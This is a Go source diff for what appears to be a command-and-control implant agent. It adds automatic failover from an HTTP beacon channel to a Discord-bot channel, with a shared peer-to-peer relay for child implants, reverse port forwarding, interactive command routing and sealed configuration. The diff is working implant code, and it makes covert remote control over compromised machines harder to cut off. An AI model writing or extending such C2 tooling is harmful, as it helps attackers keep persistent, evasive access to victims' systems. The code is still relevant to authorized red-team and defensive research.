@@ -25,13 +25,21 @@ type c2Setup struct {
 }
 
 // initC2Profile creates and configures the appropriate C2 profile based on
-// build-time configuration variables.
+// build-time configuration variables. If failoverChain is set with multiple
+// profiles (e.g., "http,discord"), a FailoverManager wraps them for automatic
+// failover on persistent connection failures.
 func initC2Profile(cfg parsedConfig) (*c2Setup, error) {
 	if tcpBindAddress != "" || namedPipeBindName != "" {
 		return initTCPC2(cfg)
 	}
-	if discordBotToken != "" {
+	if discordBotToken != "" && failoverChain == "" {
 		return initDiscordC2(cfg)
+	}
+	if httpxConfig != "" && failoverChain == "" {
+		return initHTTPxC2(cfg)
+	}
+	if failoverChain != "" && discordBotToken != "" {
+		return initFailoverC2(cfg)
 	}
 	if httpxConfig != "" {
 		return initHTTPxC2(cfg)
@@ -350,6 +358,70 @@ func initHTTPC2(cfg parsedConfig) (*c2Setup, error) {
 
 	return &c2Setup{
 		profile:  profiles.NewProfile(httpProfile),
+		rpfwdMgr: rpfwdManager,
+	}, nil
+}
+
+// initFailoverC2 builds an HTTP primary + Discord secondary profile chain wrapped
+// in a FailoverManager. Both profiles share the same TCP P2P and rpfwd instances
+// so P2P children and port forwards survive a profile switch.
+func initFailoverC2(cfg parsedConfig) (*c2Setup, error) {
+	log.Printf("failover c2: chain=%s", failoverChain)
+
+	// Build shared TCP P2P instance
+	tcpP2P := tcp.NewTCPProfile("", encryptionKey, cfg.debug)
+	if err := tcpP2P.SealConfig(); err != nil {
+		log.Printf("tcp p2p vault seal failed: %v", err)
+	}
+	commands.SetTCPProfile(tcpP2P)
+
+	// Shared rpfwd manager
+	rpfwdManager := rpfwd.NewManager()
+	commands.SetRpfwdManager(rpfwdManager)
+
+	// Build HTTP primary profile
+	primarySetup, err := initHTTPC2(cfg)
+	if err != nil {
+		return nil, fmt.Errorf("failover: primary HTTP init failed: %w", err)
+	}
+
+	// Build Discord secondary profile (reuse shared TCP P2P + rpfwd)
+	discordProfile := discord.NewDiscordProfile(
+		discordBotToken,
+		discordChannelID,
+		encryptionKey,
+		cfg.sleepInterval,
+		cfg.jitter,
+		10, 10, // default poll checks/delay
+		cfg.debug,
+		proxyURL,
+	)
+	if err := discordProfile.SealConfig(); err != nil {
+		log.Printf("discord vault seal failed: %v", err)
+	}
+	discordProfile.GetDelegatesOnly = func() []structs.DelegateMessage {
+		return tcpP2P.DrainDelegatesOnly()
+	}
+	discordProfile.GetDelegatesAndEdges = func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
+		return tcpP2P.DrainDelegatesAndEdges()
+	}
+	discordProfile.HandleDelegates = func(delegates []structs.DelegateMessage) {
+		tcpP2P.RouteToChildren(delegates)
+	}
+	discordProfile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
+	discordProfile.HandleRpfwd = rpfwdManager.HandleMessages
+	discordProfile.GetInteractiveOutbound = commands.DrainInteractiveOutput
+	discordProfile.HandleInteractive = commands.RouteInteractiveInput
+
+	fm := profiles.NewFailoverManager(
+		[]profiles.Profile{primarySetup.profile, profiles.NewDiscordProfile(discordProfile)},
+		[]string{"http", "discord"},
+		cfg.failoverThreshold,
+		cfg.failoverRecovery,
+	)
+
+	return &c2Setup{
+		profile:  fm,
 		rpfwdMgr: rpfwdManager,
 	}, nil
 }
